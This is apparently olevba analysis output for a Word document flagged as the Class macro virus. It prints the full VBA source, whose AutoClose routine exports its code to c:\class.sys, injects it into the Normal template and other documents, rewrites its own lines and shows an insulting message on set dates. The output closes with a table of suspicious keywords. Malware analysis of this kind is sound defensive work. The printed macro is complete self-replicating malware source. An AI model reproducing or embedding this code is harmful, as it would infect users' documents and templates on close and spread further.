olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bm-e63c0faf5b6bed393bb24185ae17984080983dd1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bm-e63c0faf5b6bed393bb24185ae17984080983dd1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Harry H.6/7/01 6:44:16 PMDok1.doc
On Error GoTo out
'Harry H.6/7/01 6:44:17 PMDok1.doc
Options.VirusProtection = True
'Harry H.6/7/01 6:44:17 PMDok1.doc
Options.SaveNormalPrompt = True
'Harry H.6/7/01 6:44:17 PMDok1.doc
Options.ConfirmConversions = True
'Harry H.6/7/01 6:44:17 PMDok1.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Harry H.6/7/01 6:44:17 PMDok1.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Harry H.6/7/01 6:44:17 PMDok1.doc
If nt > 70 And ad > 0 Then GoTo out
'Harry H.6/7/01 6:44:17 PMDok1.doc
If nt < 70 Then
'Harry H.6/7/01 6:44:17 PMDok1.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Harry H.6/7/01 6:44:17 PMDok1.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Harry H.6/7/01 6:44:17 PMDok1.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Harry H.6/7/01 6:44:17 PMDok1.doc
End If
'Harry H.6/7/01 6:44:17 PMDok1.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Harry H.6/7/01 6:44:17 PMDok1.doc
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Harry H.6/7/01 6:44:17 PMDok1.doc
host.codemodule.AddFromFile ("c:\class.sys")
'Harry H.6/7/01 6:44:17 PMDok1.doc
With host.codemodule
'Harry H.6/7/01 6:44:17 PMDok1.doc
    For x = 1 To 4
'Harry H.6/7/01 6:44:17 PMDok1.doc
    .deletelines 1
'Harry H.6/7/01 6:44:17 PMDok1.doc
    Next x
'Harry H.6/7/01 6:44:17 PMDok1.doc
End With
'Harry H.6/7/01 6:44:17 PMDok1.doc
If nt < 70 Then
'Harry H.6/7/01 6:44:17 PMDok1.doc
    With host.codemodule
'Harry H.6/7/01 6:44:17 PMDok1.doc
    .replaceline 1, "Sub AutoClose()"
'Harry H.6/7/01 6:44:17 PMDok1.doc
    .replaceline 91, "Sub ToolsMacro()"
'Harry H.6/7/01 6:44:17 PMDok1.doc
    For x = 70 To 81
'Harry H.6/7/01 6:44:17 PMDok1.doc
        .deletelines 62
'Harry H.6/7/01 6:44:17 PMDok1.doc
    Next x
'Harry H.6/7/01 6:44:17 PMDok1.doc
    .replaceline 35, "    For x = 1 To 4"
'Harry H.6/7/01 6:44:17 PMDok1.doc
    End With
'Harry H.6/7/01 6:44:17 PMDok1.doc
End If
'Harry H.6/7/01 6:44:17 PMDok1.doc
With host.codemodule
'Harry H.6/7/01 6:44:17 PMDok1.doc
    For x = 2 To 104 Step 2
'Harry H.6/7/01 6:44:17 PMDok1.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Harry H.6/7/01 6:44:17 PMDok1.doc
    Next x
'Harry H.6/7/01 6:44:17 PMDok1.doc
End With
'Harry H.6/7/01 6:44:17 PMDok1.doc
out:
'Harry H.6/7/01 6:44:17 PMDok1.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Harry H.6/7/01 6:44:17 PMDok1.doc
End Sub
'Harry H.6/7/01 6:44:17 PMDok1.doc
Sub ToolsMacro()
'Harry H.6/7/01 6:44:17 PMDok1.doc
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

